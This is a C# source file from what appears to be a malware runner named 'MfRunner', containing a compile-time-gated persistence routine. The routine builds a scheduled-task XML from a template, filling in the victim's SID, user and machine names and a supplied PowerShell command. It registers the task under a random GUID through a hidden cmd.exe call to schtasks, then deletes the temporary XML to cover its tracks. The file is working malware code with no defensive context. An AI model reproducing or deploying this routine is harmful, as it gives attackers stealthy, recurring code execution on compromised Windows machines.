using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
#if PERSISTANCE
        public static void InitializePersistance(string powershellCommand)
        {
            string schtaskTemplate = IsElevated ? SCHTASKS_TEMPLATE_ADMIN : SCHTASKS_TEMPLATE_USER;
            string taskName = Guid.NewGuid().ToString();

            schtaskTemplate = schtaskTemplate.Replace("REPLACE_TIMESTAMP", DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss"));
            schtaskTemplate = schtaskTemplate.Replace("REPLACE_AUTHOR", Environment.GetEnvironmentVariable("computername") + "\\" + Environment.GetEnvironmentVariable("username"));
            schtaskTemplate = schtaskTemplate.Replace("REPLACE_NAME", taskName);
            schtaskTemplate = schtaskTemplate.Replace("REPLACE_SID", WindowsIdentity.GetCurrent().User.Value);
            schtaskTemplate = schtaskTemplate.Replace("REPLACE_COMMAND", powershellCommand);

            string xmlFileName = GenerateRandomString() + ".xml";
            string xmlFilePath = Environment.GetEnvironmentVariable("temp") + "\\" + xmlFileName;

            File.WriteAllText(xmlFilePath, schtaskTemplate);

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c cd %temp% && schtasks /create /xml " + xmlFileName + " /tn " + taskName;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            p.WaitForExit();

            Thread.Sleep(1000);
            try
            {
                File.Delete(xmlFilePath);
            } catch {}
        }
#endif
    }
}
